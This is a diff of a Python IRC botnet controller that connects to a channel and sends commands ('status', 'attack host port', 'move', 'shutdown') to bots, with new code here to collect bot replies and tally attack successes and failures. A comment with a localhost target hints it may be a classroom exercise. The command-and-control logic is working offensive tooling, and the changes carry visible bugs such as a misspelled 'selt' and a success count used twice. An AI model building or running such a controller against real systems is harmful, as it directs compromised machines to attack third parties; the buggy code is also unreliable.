@@ -1,7 +1,6 @@
 
 import socket
 import time
-import irc
 import random
 import string
 import sys
@@ -52,7 +51,12 @@ class conBot(threading.Thread):
         self.command = ["initial Command"]
         self.inThread = threading.Thread(target = inputThread)
         self.comList = ["status","attack","move","quit","shutdown"]
+        self.responses = ["!ATTACK!","!STATUS!","!MOVE!","!SHUTDOWN!"]
         self.botList = []
+        self.attackBotListSucc = []
+        self.attackBotListFail = []
+        self.moveBotList = []
+        self.isConnected = False
         threading.Thread.__init__ ( self ) 
         
         self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -65,7 +69,7 @@ class conBot(threading.Thread):
             #time.sleep(5)
             self.s.connect((self.host,self.port))           
         
-        self.counter = 0
+       
         
         self.controller = ""
         self.gameOn = False
@@ -165,6 +169,15 @@ class conBot(threading.Thread):
             #:simdevs!~simdevs@136.159.160.155 PRIVMSG #simdevs :!attack localhost 7788
             self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command).encode("utf-8"))
 
+    def handleResponse(self, prefix,test):
+        name = prefix.split("!~")
+        if(test[0] == "!STATUS!"):
+            if(name not in self.botList):
+                self.botList.append(name[0])
+                print(self.botList)
+        if(test[0] == "!ATTACK!"):
+            print(test[1:])
+            
     def connection(self):
     
         self.connectIRC(self.s,self.NICK,self.chan)        
@@ -172,10 +185,10 @@ class conBot(threading.Thread):
         getInput = True
         print("Connected to IRC...")
         count =0  
-        socket_list = [sys.stdin, self.s]
-        isconnected = False
+        socket_list = [ sys.stdin, self.s ]
+        #isconnected = False
         try:
-            while getInput:
+            while True:
                 read_socks, write_socks, error_socks = select.select(socket_list,[],[])
                 for sock in read_socks:
                     if(sock == self.s):
@@ -185,13 +198,16 @@ class conBot(threading.Thread):
                         if(command == '353'):
                             print("line 170")
                             #threading.Thread(target = prompt).start()
-                            isconnected = True
-                            threading.Thread(target = prompt).start()                                
+                            self.isConnected = True
+                            #threading.Thread(target = prompt).start()                                
                         elif command == "PRIVMSG":
+                            self.isConnected = True
                             test = args[1].split() 
                             print("prefix: " + prefix)
-                            if(isconnected):
-                                threading.Thread(target = prompt).start()
+                            if(test[0] in self.responses):
+                                self.handleResponse(prefix,test)
+                            #if(isconnected):
+                                #threading.Thread(target = prompt).start()
                                 #threading.Thread(target = prompt).start()
                         elif command == "PING":
                             self.s.send("PONG {}: :\r\n".format(prefix).encode("utf-8"))
@@ -200,19 +216,26 @@ class conBot(threading.Thread):
                         elif command == '433':
                             self.createNick(NICK)
                             self.connectIRC(self.s,self.NICK, self.chan)
-                        
+                         
                     elif (sock == sys.stdin):
                         self.command = sys.stdin.readline().split()
                         print("command = ")
                         print(self.command)
                         if(self.command[0] == self.activationPhrase):
+                            self.isConnected = True
                             self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, self.command[0]).encode("utf-8"))
-                        elif(self.command[0] == "status") :                    
+                        elif(self.command[0] == "status") :  
+                            self.botList = []                  
                             self.s.send("PRIVMSG {} : {}\r\n".format(self.chan, "!"+self.command[0]).encode("utf-8"))
                         elif(self.command[0] == "attack") :                    
                             self.s.send("PRIVMSG {} : {} {} {}\r\n".format(self.chan, "!"+self.command[0],self.command[1],self.command[2]).encode("utf-8"))
-                        threading.Thread(target = prompt).start()                                  
-                
+                        elif(self.command[0] == "move"):
+                            self.s.send("PRIVMSG {} : {} {} {} {}\r\n".format(self.chan,"!"+self.command[0],self.command[1],self.command[2],self.command[3]).encode("utf-8"))
+                        #threading.Thread(target = prompt).start()                                  
+                    
+                    if(self.isConnected):
+                        #self.prompt()
+                        threading.Thread(target = self.prompt).start() 
                     
         
         except Exception as e:
@@ -222,12 +245,21 @@ class conBot(threading.Thread):
             time.sleep(5)
             self.connection()
         
-def prompt():    
-    time.sleep(3)
-    print("Enter valid command: ")
-    #sys.stdout.write("Enter valid command:")
-    #sys.stdout.flush()
-    
+    def prompt(self):
+        self.isConnected = False   
+        time.sleep(5)
+        #print(self.command)
+        if(self.command[0] == "status"):
+            print("Found {} bots: {}".format(str(len(self.botList)),','.join(self.botList)))
+        
+        elif self.command == "attack":
+            for i in self.attackBotListSucc:
+                print("{}: attack successful".format(i))
+            for i in self.attackBotListFail:
+                print("{}: attack failed".format(i))
+            print("Total: {} successful, {} unsuccessful".format(str(len(self.attackBotListSucc)),str(len(selt.attackBotListSucc))))
+        print("Enter valid command: ")
+            
     
 def main():
         
@@ -237,15 +269,7 @@ def main():
     PHRASE = sys.argv[4]
     
     cBot = conBot(NICK,HOST,PORT,CHAN,PHRASE)
-    cBot.start()  
-    
-  
-    
-    
-    
-    
-    
-    
+    cBot.start()
             
             
 
